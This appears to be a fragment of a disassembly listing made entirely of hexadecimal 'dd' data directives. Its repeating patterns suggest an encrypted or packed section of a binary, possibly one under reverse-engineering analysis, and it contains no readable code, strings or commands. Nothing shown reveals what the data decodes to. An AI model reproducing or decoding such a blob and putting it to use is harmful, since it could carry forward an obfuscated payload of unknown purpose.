		dd 0AFB68BFFh, 0F9FEC7h, 7689EFFDh, 0EFFD1B27h,	0B8B7B68Bh
		dd 0FD00EFFCh, 0A476E03Ch, 4466B550h, 3F23D3D9h, 667C0464h
		dd 8BAFD944h, 7C41CBB1h, 0EFFDFF0Eh, 7622C600h,	0D95464B0h
		dd 0E00285D3h, 0EB6684h, 76C0DCFDh, 0A0FB8A22h,	0C56C1DD3h
		dd 0D97C66F5h, 64358BF7h, 3FFD944h, 74CA643Ch, 0CCED24ABh
		dd 50AC76C8h, 0D97466BBh, 67F98BFBh, 40CBB989h,	0BC24A376h
		dd 0EF02E16Eh, 0CDD4FD00h, 0A98B548Ah, 1F5510CBh, 33780Fh
		dd 0B18BEFFDh, 0AB7441CBh, 0E16EB524h, 0FD00EF02h, 0F3D94C66h
		dd 4464358Ah, 3503F3D9h, 0EFFD0157h, 8B0F2E00h,	0B51CCBB1h
		dd 72EC2CCh, 42CBB18Bh,	2FF0E7Ch, 2EFE00EFh, 4364358Bh
		dd 750464ADh, 0AFD94466h, 49CBB98Bh, 0BC24A376h, 0EFFDFFCAh
		dd 0FF0E7C00h, 0FE00EFFDh, 99303B27h, 0F107869h, 0FD030079h
		dd 642F33EFh, 4FF977CDh, 0B18B0D2Eh, 2A7E10CBh,	24937408h
		dd 47CAECE5h, 0EFFD00EEh, 10CBB189h, 0B524A377h, 3CBBC8ECh
		dd 24A376E2h, 0D97466EDh, 3EDE4AFBh, 0EA3C358Bh, 0B724A376h
		dd 1002E16Eh, 0D1ECFD00h, 7650A476h, 0BB7491FBh, 4C64BD24h
		dd 1C81AED9h, 0EFFD0010h, 0CDD43503h, 0A98B748Ah, 277610CBh
		dd 0EA3C152Bh, 0E6C46476h, 27FE00EFh, 40CBB98Bh, 0E6C46474h
		dd 0A37600EFh, 0E16EBC24h, 0FD00EF02h, 0F4398BEEh, 0E9C4FD00h
		dd 0BDA8052Eh, 0F3D94C66h, 10CBA989h, 0A98BFF89h, 0AD3A54CBh
		dd 10FE918h, 0FFD406EDh, 0A37600EFh, 328BF24h, 0FD00EFEAh
		dd 1002E16Eh, 0E06CFD00h, 0B94B66F2h, 64B54366h, 0C06AB543h
		dd 153B8989h, 10782D9Ch, 3F5790Fh, 2F33EFFDh, 0F977CD64h
		dd 8B0D2E4Fh, 7E10CBB1h, 9374082Ah, 0CAECE524h,	74E8D4BBh
		dd 66ED24A3h, 72FBD974h, 44D16428h, 0EFFD00EEh,	3CCBB189h
		dd 0B98B2776h, 0F2E3CCBh, 48ABB68Bh, 35032DDEh,	0F4398364h
		dd 4B66FD00h, 0B54B64B9h, 6D6EA3Ch, 83663C03h, 0FD00F439h
		dd 0FFD95466h, 0F7FEC7h, 0B98BEFFDh, 2F7820CBh,	241790Fh
		dd 0B98BEFFDh, 0A3762CCBh, 0C1C4DD24h, 0C644A476h, 0C4AB7627h
		dd 2CAC76C8h, 0B18927C6h, 0F58B1CCBh, 1B2F7E8Bh, 3D85EFFDh
		dd 0A376109Bh, 4128A924h, 0FCDF1BE5h, 0EDF9E9FFh, 5364FD00h
		dd 8BCAD4CDh, 0DBBE8BFDh, 5364372Bh, 0D94C66D5h, 0C43F03F3h
		dd 8BE816C1h, 3C2BDBBEh, 0BC76C2ECh, 8925C640h,	8B3CCBA9h
		dd 4378BFAh, 24AB760Dh,	76C1C4D5h, 0A37440A4h, 4C66C124h
		dd 0A98BF3D9h, 25C620CBh, 0CA64FB76h, 0E124A374h, 0BB74D1C4h
		dd 5464DD24h, 2C2BD3D9h, 0C7D94C64h, 8AAFAE89h,	761167EDh
		dd 0AEE124BBh, 5466B740h, 1275F3D9h, 66BD4364h,	85C7D94Ch
		dd 7485E03Dh, 28FD00EEh, 0EFE903h, 0FC7E06FDh, 0AB7600EFh
		dd 0C06ADD24h, 0FCDE6BF2h, 0AB7600EFh, 4B65D524h, 0BD0867BDh
		dd 0C7D94466h, 20CBB98Bh, 0E90328B5h, 66FD00EFh, 0E9CFD944h
		dd 0FD00EEADh, 6AF54364h, 0E06BF2C0h, 7E00EFFDh, 0C18E2012h
		dd 84E00285h, 0FD00EE59h, 0FFD94464h, 16652F33h, 1FD32276h
		dd 0E73883A0h, 18CB8189h, 7E462DFEh, 0AB742012h, 7466ED24h
		dd 2972FBD9h, 0AB76D064h, 4C64D124h, 3C2BCFD9h,	0BBD94C64h
		dd 2CCBB989h, 7614AEFCh, 27FE1CA4h, 4B663D85h, 763B9BE1h
		dd 0A37610ACh, 0C06AD524h, 0D124AB76h, 64F374BFh, 0C8C4E553h
		dd 0BCE8BDACh, 4FD00C0h, 18BC760Ch, 0AF5127D6h,	0EFD1C307h
		dd 24A37600h, 0D954649Dh, 0F7BE89F3h, 89E33983h, 0B98BDFBCh
		dd 0AB7420CBh, 4364D124h, 76C06AEDh, 0CADB752Dh, 0EFFDFFh
		dd 1DC12576h, 0EF1C81FFh, 3EFFDFFh, 77C9DC3Ch, 2EEF2483h
		dd 4466F5E0h, 3C03D3D9h, 0ECE5EA2Eh, 18ACC6C2h,	0A98BE289h
		dd 0AD3A54CBh, 1302118h, 0CE6704EDh, 0CB918902h, 0C73A7610h
		dd 0FD00F4FEh, 0E7BE8BEFh, 84E03D85h, 0FD00EF55h, 6AED4364h
		dd 9D6BF2C0h, 7E00EFFDh, 0C18E2012h, 84E00285h,	0FD00EF55h
		dd 2276C0DCh, 0D3A0FB8Ah, 0D94C641Dh, 0E73883FFh, 18CB8189h
		dd 7E4627FEh, 0A3742012h, 7466ED24h, 2972FBD9h,	0BCC6D164h
		dd 8BB0891Ch, 3A54CBB1h, 303918AEh, 328ED01h, 0FD00EFE0h
		dd 177E0364h, 8769F21Eh, 45FF1017h, 1002FF11h, 5BB2A35Fh
		dd 3E402B7Eh, 0FFD94C64h, 89ED14C1h, 7E10CBB1h,	0AB160202h
		dd 28CBB98Bh, 74049674h, 0AB760CAEh, 4166DD24h,	0A23166EDh
		dd 0B1C16B66h, 5DD7AE89h, 0FD00ED45h, 2B7E5BEFh, 0EDDC3E40h
		dd 0ED248374h, 0EFE10328h, 4428FD00h, 0FD01DBD9h, 0E71600EFh
		dd 34CBB9C7h, 2FF1000h,	0BBD94464h, 28CBB18Bh, 0DD24BB76h
		dd 66F14866h, 3066ED50h, 76049774h, 66ED24ABh, 4366C16Bh
		dd 0D54364C5h, 0FD88C06Ah, 7DF5C683h, 0D95464CBh, 0CBB18BBBh
		dd 10A5C62Ch, 0B98BC689h, 0A3762CCBh, 51BFA924h, 0FD015815h
		dd 0E73983EFh, 139B3D85h, 0FD1EEC3Ah, 0B1A200EFh, 0FF13455Dh
		dd 7E5B1002h, 643E402Bh, 8BBBD974h, 7638CBB9h, 64D12493h
		dd 4E64F956h, 0F56E64EDh, 0B976C2C4h, 316D614h,	74D7EC15h
		dd 0B9740881h, 1CA47614h, 0C524AB74h, 0ECF54364h, 892F78CFh
		dd 0C874F3B6h, 0DE89FF6Ah, 57FFBE8Bh, 0EC742F78h, 64F15664h
		dd 0D7C4E543h, 0B4E8BFAFh, 4FD00C2h, 0CA1760Fh,	0D618BC76h
		dd 7AF5120h, 0EFD7C8h, 7E18AC74h, 0A9740C2Bh, 83C47630h
		dd 0F474FC00h, 9BF3FD6Ch, 0EB2FCE04h, 0FC0057F8h, 0A47600EFh
		dd 1B360A04h, 7ED2DC34h, 127E400Eh, 0C27AF20Bh,	76C1ECB7h
		dd 0D7C3CA4h, 0EFFD80h,	0B98B3FFEh, 3EFE38CBh, 56663D85h
		dd 78049AD1h, 6CFA7410h, 4B7D97Ch, 0B98BF688h, 2F7834CBh
		dd 0FE95780Fh, 0A35F1002h, 1006B8B2h, 83B402FFh, 76C3AF39h
		dd 0B0C924ABh, 83B4A05Eh, 6DC3AF39h, 0FFFDECBEh, 10EF10BBh
		dd 0ED00019Ah, 0FFFDEE04h, 10EF1274h, 0ED001FFAh, 0FFFDF025h
		dd 10EF0C7Ch, 0ED001DDAh, 0FFFDF229h, 10EF0E37h, 0ED001C99h
		dd 0FFFDF391h, 10EF0969h, 0ED001B1Ah, 0FFFDF402h, 10EF0871h
		dd 0ED001A06h, 0FFFDF610h, 10EF0776h, 0ED001581h, 0FFFDFC3Dh
		dd 10EF0050h, 0ED00110Eh, 0FFFDFF89h, 10EEFD36h, 0ED01EF99h
		dd 0FFFC01BAh, 10EEFF0Eh, 0ED01EDE5h, 0FFFC0299h, 10EF0EF0h
		dd 0ED001BF8h, 0FFFDF4DBh, 10EF0949h, 0F924AB76h, 73B14028h
		dd 0C7FFFC65h, 0FD09BBBDh
		dd 0AF3A00EFh, 1826150h, 0A54028EDh, 0EFFD00EAh, 907F6DC3h
		dd 6D907F6Dh, 7F6D907Fh, 907F6D90h, 918BBAAEh, 0DCAB0CCBh
		dd 1CB276F6h, 88349CC4h, 0CBB68BC8h, 0EFFCB8h, 76E03CFDh
		dd 0EE9728A2h, 5510AC50h, 0F1C46CDDh, 0AC74C6D4h, 5EE68834h
		dd 0FD0157A0h, 2CA600EFh, 75C78E39h, 0D94B64EEh, 0EFFD0155h
		dd 890D2E00h, 8E89DF8Eh, 0C7AE89C3h, 14CBB98Bh,	76109A76h
		dd 29D628A4h, 72B83C3Bh, 0F17564D7h, 0C4C97B64h, 0C12E76F1h
		dd 58F3ED14h, 0E7EC864h, 0F32FCE03h, 0D54B6459h, 0AC3A5EB0h
		dd 0EFFD30h, 0D14B66FDh, 0C43E5BB2h, 0C8D4CD4Bh, 0E924A374h
		dd 27760699h, 14CBB189h, 76349476h, 9A7630BCh, 8B15FE0Ch
		dd 3CF0C42Ch, 4A0E0206h, 0E16C378Bh, 76A41CFEh,	0C4E924A3h
		dd 8BC789C1h, 868BE388h, 0C4358BDBh, 0C13E76F0h, 58F3ED14h
		dd 0E7ECA64h, 894B0E03h, 0BE8BDFBEh, 66A35FC7h,	33B2D143h
		dd 76C3B43Dh, 0AC763094h, 8B16FE28h, 0CD7B662Ah, 0E888D0D4h
		dd 0DFBEC7h, 7600EFFDh,	3FC62CBCh, 0D1ECF873h, 0A22CBC74h
		dd 2FCE5DB1h, 907F3E5Bh, 6D907F6Dh, 7F6D907Fh, 907F6D90h
		dd 0D97464ABh, 9B0B85E7h, 1CA97638h, 0CC742F78h, 6AD94E64h
		dd 8BC589C9h, 3D85DBBDh, 64AD0A9Bh, 0FFBFD546h,	0F5C46C2Ch
		dd 64E14E64h, 52BED556h, 7E24B902h, 0A93A082Bh,	0EFFD1Ch
		dd 0A3C0DCFDh, 1003B82Ch, 0C3B102FFh, 6D907F6Dh, 7F6D907Fh
		dd 10CBB98Bh, 0F124A376h, 0E7D95464h, 24AB7650h, 0FD6ABEF5h
		dd 0E0970885h, 50BDF56Ah, 0FD00E015h, 0CF3983EFh, 907F6DC3h
		dd 6D907F6Dh, 7F6D907Fh, 1CCBB98Bh, 0A8D2DCAEh,	0B83F3BB9h
		dd 0EFFCBDh, 0E984E0FDh, 65FD00EDh, 8E27700h, 0C710EE92h
		dd 0EB780F2Eh, 83EFFD02h, 0C530CB81h, 0EE0485E0h, 7C64FD00h
		dd 73BFBD9h, 0B1A20A9Ah, 0FF11455Dh, 3E5B1002h,	66DD4764h
		dd 0C2D4E557h, 0BAC7E588h, 0EED910CFh, 28B87410h, 8824B8C4h
		dd 0CBBAC7E8h, 10EED930h, 0E524A376h, 9A02F96Ch, 24AB3A0Ch
		dd 0FD00E9E5h, 0CBB18BEFh, 24B37618h, 80DAD4DDh, 181033E9h
		dd 83E216DBh, 0F57EE006h, 0EFFD0252h, 10047E00h, 0D924AB76h
		dd 93FCF86Ch, 9177E9Dh,	81837782h, 9AF51CCBh, 8147E91h
		dd 6836381h, 0D47A7FE0h, 836C81CAh, 720FE604h, 1002FF95h
		dd 28CBB98Bh, 710F2DC6h, 1002FF81h, 0FEB0583h, 2FF8A72h
		dd 0E7068310h, 954F875h, 7600EFFDh, 2B9528A0h, 6AEFFD16h
		dd 0AAFFBEFCh, 6C0D8BCFh, 0F66AF1C4h, 0A35FE588h, 1001B8B2h
		dd 0C3B402FFh, 741C9874h, 0B1741881h, 8B247630h, 4024CBA1h
		dd 0EFFD00EEh, 4B6218D3h, 0FD0157FAh, 0F2E00EFh, 83BFB389h
		dd 0C389ED3Ch, 0EFE14628h, 8DEFFD00h, 938910A8h, 0A3BB89C3h
		dd 54A97448h, 57AA4445h, 0DBAB8945h, 0EA3E1CF7h, 7658B974h
		dd 0ED9728A8h, 5710AD55h, 0D14E64DDh, 64C54666h, 285D557h
		dd 0AAFFBDACh, 0AFBB89CFh, 8BA3BB8Bh, 0FF6AC7B2h, 0B80251BFh
		dd 44A97420h, 4506A470h, 0EFFD00EEh, 162F7BC7h,	0FD00EFFDh
		dd 0F2E00EFh, 8666F96Ah, 0FD00F961h, 0BFD55764h, 20B80252h
		dd 0EB9C6176h, 2B7E00EFh, 8A97430h, 0FD8DFB70h,	66FD00EFh
		dd 5664F156h, 89D26AC5h, 0AFAB8BBFh, 499B2F85h,	7844B976h
		dd 6ABF743Dh, 8BD189C0h, 17D1B82Ch, 0E7D94629h,	8DBFE98Dh
		dd 3503A7F9h, 0F9599666h, 5464FD00h, 7389C3D9h,	0EFFD1677h
		dd 1CCBB18Bh, 0FD887974h, 617400EFh, 0EFFD84h, 0FD00D015h
		dd 0EB3983EFh, 5BB2A35Fh, 0F946283Eh, 0EFFD0275h, 180D5A1h
		dd 0BA89B8EDh, 0E59FE8F7h, 0C46CFD00h, 2FC57F9h, 0B1A2FF10h
		dd 5F2CA65Dh, 7B8B2A3h,	0B402FF10h, 907F6DC3h, 6D907F6Dh
		dd 7F6D907Fh, 8BB8AB53h, 0CE10CB81h, 9B063B34h,	1C98767Ah
		dd 8E741CC6h, 9BDD5FD6h, 24B0C46Eh, 0A2898689h,	0E7A289FBh
		dd 0C7F7A289h, 0FD02C3BAh, 0A97600EFh, 14B17408h, 7610A974h
		dd 2CC618A9h, 0D818F87Dh, 7618A974h, 64AE18A9h,	0D918AEC8h
		dd 7E5326E6h, 2E7EB90Eh, 2177E71h, 8804A174h, 0C843E8E8h
		dd 504FD00h, 0FD25A815h, 0E33983EFh, 89DFBA89h,	1556C7A3h
		dd 0EFFD2A57h, 0A6D1556h, 3983EFFDh, 0B03D33E7h, 5F2CA65Eh
		dd 2FE57A3h, 2CA6FF10h,	6C64A853h, 7856E3D9h, 6BF25702h
		dd 0EFF5E0h, 781C9A76h,	3A790F19h, 8BEFFD08h, 7E18CBB1h
		dd 60F20516h, 0EFF5C8h,	710F2678h, 0EFFD082Fh, 85E3B88Bh
		dd 5184E03Dh, 6CFD00E7h, 75EFFD7Dh, 0F94564F6h,	6AF2C06Ah
		dd 0EFF59Bh, 0C004A976h, 0EFFD0275h, 0F96CF475h, 7585E0F9h
		dd 64FD00E7h, 0D26AED55h, 0D1A1FD88h, 0B0ED0180h, 5EF7B889h
		dd 2FB57A0h, 2CA6FF10h,	83C7AB8Bh, 0D389C505h, 0FBD95466h
		dd 0BBC7B389h, 0FD00EFFFh, 0ED1D85E0h, 5ED6FD00h, 0C985E0E5h
		dd 85FD00EDh, 6AEF9700h, 0DBEA07FDh, 0AA7400EFh, 8A97630h
		dd 7E14A176h, 0EB3B0C2Bh, 4664E208h, 0F55664E9h, 0FBBB89AFh
		dd 8BEDF9C6h, 76149176h, 64BA08A1h, 149174C7h, 0F501EB3Bh
		dd 64E95664h, 85ADE146h, 0E956663Dh, 6AF2FA64h,	0EFFD9Ah
		dd 7508B976h, 91763AEBh, 8A17614h, 74C764BAh, 0EB3B1491h
		dd 5664FD01h, 0AB89ADE9h, 643F8BFBh, 429F556h, 0B38BEFFFh
		dd 0A17441FBh, 8B2E7614h, 0F9C6E7B3h, 0A97600EEh, 8B97614h
		dd 0E94666BDh, 0EFFF0429h, 8BFB838Bh, 0FD006B7Bh, 177E47EFh
		dd 14917409h, 0F9752076h, 0FA16C364h, 676339h, 0F57DEFFDh
		dd 0EB81C3D4h, 5043D33h, 0FD00EB45h, 0E7AB8BEFh, 8BE5F988h
		dd 7441FBB3h, 2E7614A1h, 0C6E7B38Bh, 760BEEF9h,	28BD14A9h
		dd 9EF946h, 0BB89EFFDh,	0EE0DE9FBh, 5064FD00h, 0D14864D9h
		dd 3DE7DA18h, 0F7FF1F83h, 0DEC9F524h, 642C0224h, 0D918E148h
		dd 1C8326E7h, 642C02E7h, 0D918ED48h, 1C8326E7h,	642C02EBh
		dd 8B267808h, 680FE7B3h, 672D022Fh, 7E64C414h, 0E15664E9h
		dd 0A8F54E64h, 8AFB8389h, 3A8BEBAFh, 64FC1467h,	4E64E956h
		dd 0AB89ADE1h, 643F8BFBh, 4E64F951h, 0F5EA2EF5h, 64FC1467h
		dd 5664E946h, 0BB89AFE1h, 0EBB78BFBh, 0C1E7AB8Bh, 0F188FF14h
		dd 0FBAB8BEDh, 42F3B38Bh, 7614B974h, 0EBAC8B2Dh, 0C1E7B38Bh
		dd 0E988F717h, 0FB838BEEh, 6B7B8Bh, 7E47EFFDh, 91740917h
		dd 75207614h, 16C364F9h, 676339FAh, 7DEFFD00h, 81C3D4F5h
		dd 43D33EBh, 0EB4505h, 0AB8BEFFDh, 0E5F988E7h, 8BFBA38Bh
		dd 0AB8BF3B3h, 0B17443E7h, 0CA67714h, 0F1882C76h, 0FB838BEDh
		dd 47F3BB8Bh, 76149174h, 0FFAD8B20h, 2A9B2F85h,	7708B976h
		dd 0EB7514AFh, 14B9760Ah, 0BF1CA176h, 64E95666h, 14BE76C2h
		dd 3C08A176h, 0FB750805h, 14A97601h, 0E94666BDh, 0B976C864h
		dd 2CAD761Ch, 0E9742F78h, 0BEF54664h, 50DFB08Bh, 0D9DA07ACh
		dd 2B7E00EFh, 30AA740Ch, 0FD20A93Ah, 28FD00EFh,	0AAF946h
		dd 5EE9EFFDh, 64FD00EFh, 8664CD4Eh, 0FD00EF75h,	6EF1E12Eh
		dd 97FDE9h, 80C3D4FDh, 6B7B8BCBh, 3BEFFD00h, 7E1A933Eh
		dd 0E8800617h, 0EFFCB8h, 0CE1004FDh, 0E905833Dh, 32D680Fh
		dd 16C2642Eh, 2E3D33EDh, 0C8E4FBE0h, 786CA976h,	6CFE742Fh
		dd 0C164DDC9h, 0E2BF3DCEh, 28FD00EFh, 9EF946h, 0AF7EFFDh
		dd 20FECAC4h, 0C907AB51h, 7600EFF8h, 2B7E6CA9h,	742F7808h
		dd 0CD4564DDh, 0BFEDE82Eh, 55D1556h, 0B08BEFFDh, 101C81DFh
		dd 51EFFDFFh, 0F8A207ABh, 2B7E00EFh, 6AEF9710h,	150085FDh
		dd 0EFFD215Bh, 89E33983h
		dd 8383DFB8h, 6AF245EBh, 0EFFDD4h, 761CB976h, 2F7810ADh
		dd 50790Fh, 0BF8BEFFDh,	0CF838BFBh, 25FBB38Bh, 0FD001002h
		dd 9D8EF8D4h, 8BFBBB8Bh, 3A3BE383h, 9576389Ah, 7410782Ch
		dd 8BC1D4E1h, 0E7AB8BF7h, 8BBF3C2Bh, 2C03DFB8h,	221550BDh
		dd 83EFFD23h, 0B889E339h, 8E1555DFh, 8BEFFD05h,	0AB8BFBBBh
		dd 0EB3983E3h, 0C8643F3Bh, 0AB8BDF89h, 0CF838BF3h, 8BE7A38Bh
		dd 0E98AFFAFh, 0ECE988D5h, 8BFBAB8Bh, 7442CFBBh, 0B97614B9h
		dd 4666BD1Ch, 0E97A64DDh, 1002E76Eh, 0C7D4FD00h, 0BB8B618Fh
		dd 0C3AD8BF3h, 1F9B2F85h, 0C614A976h, 64E5762Eh, 0C1C4F556h
		dd 0CD4564ADh, 0BFAFD1ECh, 0CCA2E8h, 0F1C46CFDh, 64CD4566h
		dd 5664E14Eh, 0E951D4DDh, 0A93A0E9Ah, 0EFFD20h,	0F94628FDh
		dd 0EFFD00A6h, 49EB8383h, 0FDB86AF2h, 0A97600EFh, 1CA7761Ch
		dd 790F2678h, 0EFFD004Ch, 8BFBAB8Bh, 0B38BFBBBh, 9A3C3BE3h
		dd 1CA1763Bh, 782C9676h, 0D4E17410h, 8BF78BC2h,	3F2BDFB0h
		dd 0E7BB8BBFh, 51BF3F03h, 0FD221415h, 0E33983EFh, 55DFB889h
		dd 0FD046015h, 0FBBB8BEFh, 83E3B38Bh, 3C3BEB39h, 0C989D064h
		dd 8BF3838Bh, 2633CFB3h, 0F3828BAEh, 0FFE0A18Ah, 7620A174h
		dd 0F37508A1h, 14A17601h, 74DB6ABCh, 0E88914A1h, 15468EBh
		dd 7600EFFDh, 0A7761CA9h, 7426782Ch, 0E94664E2h, 0F78BC2D4h
		dd 2BE7B38Bh, 76CAEC3Fh, 0BEAD30BAh, 227D1552h,	3983EFFDh
		dd 0DFB889E3h, 0A9A2685h, 3A20B174h, 0EFA604A9h, 7E6CFD00h
		dd 780FB4F9h, 0EFFD005Ah, 8BF3BB8Bh, 3485CBB5h,	0EF5D84E0h
		dd 5664FD00h, 0E94664E9h, 0D4F14E64h, 8BD488C1h, 848BF3B3h
		dd 9B0285C3h, 762DC61Ch, 0CD4D64E5h, 64ADC2C4h,	0C2ECF546h
		dd 0C4E8BEADh, 6CFD00CDh, 4566F1C4h, 30E8BACDh,	64FD00ECh
		dd 4E64E946h, 0F9C46CF1h, 3F76C1D4h, 7E64DB74h,	0DD4E64E1h
		dd 64BCDBDCh, 5C65D97Fh, 0B38910F2h, 0E7B38BCFh, 8BEEE188h
		dd 7841FBB3h, 0FBB38934h, 9504FA74h, 0FD00EE46h, 0F3BB8BEFh
		dd 85C3B58Bh, 761F9B34h, 2DC614A9h, 4E64E576h, 0FEC2C4F5h
		dd 0DFA88B25h, 0E8BDAC50h, 0FD00CE2Dh, 66F1C46Ch, 0DB6ACD45h
		dd 0BBC7E888h, 0EFFD67EBh, 4917E00h, 766A9A9Ah,	0A7761CA9h
		dd 7426782Ch, 0E94E64A4h, 6CF14664h, 0C8D4FFC1h, 1555E68Bh
		dd 0EFFD03D3h, 8BEB3983h, 0B38BFBBBh, 0EDAD8DE3h, 3D982C3Bh
		dd 7708A176h, 0EF9730BAh, 1467FD6Ah, 0E97E64FCh, 0A8F55664h
		dd 8BFB8389h, 3A8BDFB0h, 63C0085h, 2E37508h, 0BD14A976h
		dd 7E94666h, 0EFDC5Ch, 740C2B7Eh, 0A93A30AAh, 0EF8C04h
		dd 0E94664FDh, 0F189C06Ah, 20D1555h, 0B88BEFFDh, 0EB3983FFh
		dd 389A3D85h, 228A93Ah,	0B002FF10h, 0C0DCA05Eh,	0B88B2CA6h
		dd 9A3D85EBh, 24A37623h, 0D94464E5h, 90353BFBh,	4167E1Bh
		dd 0D1A1F989h, 0B0ED0180h, 5EF7B889h, 2FB57A0h,	2CA6FF10h
		dd 18CBB18Bh, 7604A976h, 75C004BAh, 75EFFD02h, 89D26AEAh
		dd 0C3F08BF8h, 5FFFFC6Fh, 0A318A274h, 1006B8B2h, 0C3B402FFh
		dd 0E7753D78h, 6A895664h, 85FC88D2h, 784E034h, 0D2FD00EFh
		dd 0EFFF9Ah, 0FDEF6BF2h, 697600EFh, 0EFFD88h, 8802177Eh
		dd 0CBA98BE2h, 0E8B9AF18h, 0FD00FCB9h, 177E2804h, 8BE28803h
		dd 0AD18CBB9h, 0FF7FE8B9h, 1604FD00h, 0FD846976h, 0BB7600EFh
		dd 56BDE524h, 240E370h,	81658DFBh, 0C46CED01h, 0FFF86CF5h
		dd 177E059Bh, 0C7E88803h, 0FF9AEBBBh, 2F7800EFh, 14F790Fh
		dd 583EFFDh, 78790FEDh,	83EFFD01h, 780FEE05h, 0EFFD006Eh
		dd 18CBB98Bh, 8801177Eh, 321556E4h, 83EFFD24h, 0B2EBEB39h
		dd 9BF8F86Ch, 6AEF974Ah, 0AB0085FDh, 0EFD92707h, 24AB7600h
		dd 0EDC46CD5h, 9AFEF86Ch, 4CA97632h, 0CE44A176h, 0BB74663Dh
		dd 46640341h, 0B97E64B1h, 11FD4C62h, 0D9643D33h, 0E02063Ch
		dd 6C368B44h, 0AA1CFEE1h, 8874B9C4h, 83AB89E9h,	55B3AB89h
		dd 0FD016C15h, 0FFB88BEFh, 85EB3983h, 3A0E9A3Dh, 100228A9h
		dd 5EB002FFh, 0A6C0DCA0h, 0CB81832Ch, 79BF918h,	0CE5DB1A2h
		dd 643E5B2Fh, 0C06AE546h, 0A35FE582h, 0EFFCB8B2h, 0C3B4FD00h
		dd 0F202177Eh, 0EFFDA16Ah, 8A17600h, 7714B976h,	0EB7530AAh
		dd 14917611h, 0BA08B976h, 64E97E66h, 0C764CD4Dh, 7508063Ch
		dd 0A97602E3h, 8B97614h, 0E94666BDh, 2ECD4D64h,	0C67EDE9h
		dd 0E97E64FFh, 0A8F55664h, 8BFB8389h, 3A8BDFB0h, 67E5E92Eh
		dd 5E64FF0Ch, 0F54E64E9h, 0FBA389ACh, 8BE7A88Ah, 0FC14673Eh
		dd 64E97E64h, 89A8F556h, 0B08BFB83h, 2E3A8BE7h,	0C67F5E9h
		dd 0E94664FFh, 0AFF55664h, 8BFBBB89h, 14C1E7B0h, 0EDF188FFh
		dd 8BFB838Bh, 7447E7ABh, 0A2761491h, 0C1287608h, 0F188F714h
		dd 0FBBB8BEDh, 14A97440h, 0B88BCF16h, 0FF15C1DFh, 6507AB50h
		dd 7600EFFDh, 0E7C30A2h, 0EF02FFh, 0A8E8B9ACh, 6CFD00EFh
		dd 0E8BAEDC4h, 0FD00EF81h, 6CE54664h, 0C06AF9C4h, 25F7EA83h
		dd 64E54666h, 0C0DCE94Eh, 3485B1A2h, 7BF25BB2h,	45643EC0h
		dd 88C06AEDh, 0C7BBC7E8h, 0FF1002FFh, 0CE5DB1A2h, 643E5B2Fh
		dd 180DD15h, 0E55566EDh, 57A05EB0h, 0FF1002FEh,	6D902CA6h
		dd 7F6D907Fh, 4CBB98Bh,	0F524A376h, 9F7657B9h, 14977608h
		dd 17C13E76h, 0D1E988E7h, 8BFBAD8Bh, 7442E78Dh,	67A214BFh
		dd 4864EB0Ch, 745EAEE9h, 7F3E14A7h, 4CBB98Bh, 0E17064ABh
		dd 64ED4864h, 0D1D4E956h, 2C8BED8Bh, 0B789D26Ah, 8BFF8B8Bh
		dd 248BBC37h, 0E3858BB8h, 0F3ED14C1h, 7ECB6458h, 4B0E030Eh
		dd 8BE3858Bh, 703F3B5h,	64F17866h, 0F2ECED71h, 76109E74h
		dd 977614B7h, 1CA77610h, 72B35FEh, 66E95866h, 7164ED78h
		dd 0F2BB0E9h, 0FB8C89B4h, 8BF3BD8Bh, 3485FBB5h,	0A776069Ah
		dd 10A77408h, 6D902CA3h, 7F6D907Fh, 907F6D90h, 6D907F6Dh
		dd 0CB898BB9h, 57197808h, 0FDA86BF2h, 0A97600EFh, 0F2F781Ch
		dd 0FD007279h, 0EB858BEFh, 74C50283h, 0B8FF6CDCh, 107E1C9Bh
		dd 83F88949h, 0EF74B402h, 9B9AFF6Ch, 71107E0Dh,	281E789h
		dd 0EFFD0275h, 40648975h, 89C06AF5h, 0A97650E4h, 5610AD28h
		dd 0F5C46CD9h, 64E14E64h, 0C06AB941h, 0AB8BE489h, 10AF50C7h
		dd 0C46CD956h, 0E14664F5h, 6ABD4064h, 8BE489C0h, 0AC50C7B3h
		dd 6CD95610h, 5664F5C4h, 0C54264E1h, 0E489C06Ah, 28A97650h
		dd 0D95610ADh, 64F5C46Ch, 5664E14Eh, 252BED5h, 2B7E24B9h
		dd 832FCE08h, 0BBC79E02h, 0EFFD00F3h, 0C07AF200h, 24B0B5h
		dd 57A2C3B1h, 0FF1002FEh, 6D902CA3h, 0EBD95464h, 0F6DCAB53h
		dd 762CAD76h, 0F2C4CA5h, 8BD3BF89h, 9B57ABBFh, 11B57466h
		dd 8BA3B78Bh, 3D33AB87h, 11F44C62h, 0E92E248Bh,	76AB1CFFh
		dd 0EC1C8324h, 826457F3h, 0FD00EF79h, 62A2C9DCh, 0E02EBD04h
		dd 758B89FFh, 0FFFC6E7Dh, 6F7789h, 3433EFFDh, 7F758B89h
		dd 89FFFC6Eh, 0FD006377h, 893433EFh, 6E7B758Bh,	7789FFFCh
		dd 0EFFD007Fh, 8B893433h, 0FC6E7975h, 838F89FFh, 89B38F89h
		dd 0FFB89B8Fh, 66FD00EFh, 72669572h, 0B789B1B5h, 97BF8993h
		dd 5B8FBF89h, 6D907F3Eh, 7F6D907Fh, 8BB9A853h, 4610CB89h
		dd 0EFFDFF10h, 83E3BB8Bh, 3E3B143Dh, 3776029Ch,	14CB918Bh
		dd 7E74A976h, 0CF8A0117h, 1D91556h, 0BB8BEFFDh,	0EB39839Bh
		dd 109A3D85h, 790F0278h, 0EFFD01FAh, 84E03D85h,	0FD00EF56h
		dd 28914E64h, 0EF8946h,	3503EFFDh, 64914E66h, 5664A14Eh
		dd 0E4046291h, 3FC6049Bh
dword_42479C	dd 0D0C4C272h, 786CA974h, 9BAB8926h, 5664FA7Ch,	16D1ECC5h
		dd 0C42F33EDh, 50EF97C1h, 0E8B9AFh, 64FD00CDh, 6CA9760Eh
		dd 0A14666ACh, 10008F07h, 83F976FFh, 0BF8BFB39h, 0E03D85FFh
		dd 0EF4D84h, 0A14E64FDh, 64915664h, 0D1C4D146h,	0FD01E9D0h
		dd 0E02D3BEFh, 0FF109E82h, 81C96A02h, 0D7BB8BE8h, 2043C03h
		dd 0FD6A2FCEh, 7AB50BDh, 0EFDFB0h, 0B38BF976h, 0A1745283h
		dd 0FDAD155Ch, 0FB8B1002h, 64E9C46Ch, 0C96AED48h, 0D0E98889h
		dd 6402FF10h, 0C96AA14Eh, 0BB8BE881h, 43C03D7h,	332FCE02h
		dd 0F9FD6C2Fh, 0BD3F94E0h, 2B83AB8Bh, 0AB50BD2Ch, 0EFDF6B07h
